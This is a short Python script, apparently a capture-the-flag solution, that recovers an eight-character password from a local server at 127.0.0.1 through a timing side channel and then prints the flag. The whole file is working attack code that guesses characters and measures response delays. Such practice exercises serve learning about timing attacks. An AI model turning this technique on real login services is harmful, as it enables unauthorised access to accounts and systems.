__author__ = 'davidwr'
import socket as sck

import time

# Set all 8 characters to be '/' that way we can check '0'
password = ['/'] * 8
string = "Bad password!"
msg = ''
max_time = 1

while string == "Bad password!":
    a = str.encode(''.join(password))
    # print(a)
    # Declaring a socket
    socket = sck.socket(sck.AF_INET, sck.SOCK_STREAM)
    # Connecting to server
    socket.connect(("127.0.0.1", 1234))
    # First message: Enter a password
    socket.recv(1024)

    # Sending the current password
    socket.send(a)

    # Check receiving time
    s_t = time.time()
    strings = socket.recv(1024).decode('utf-8')
    e_t = time.time()

    if password[len(msg)] == '/':
        max_time = abs(s_t - e_t) + 0.05  # Margin of error

    if max_time < abs(s_t - e_t):
        msg += password[len(msg)]
    else:
        password[len(msg)] = chr(ord(password[len(msg)]) + 1)
    socket.close()

# Print the flag
print(strings)
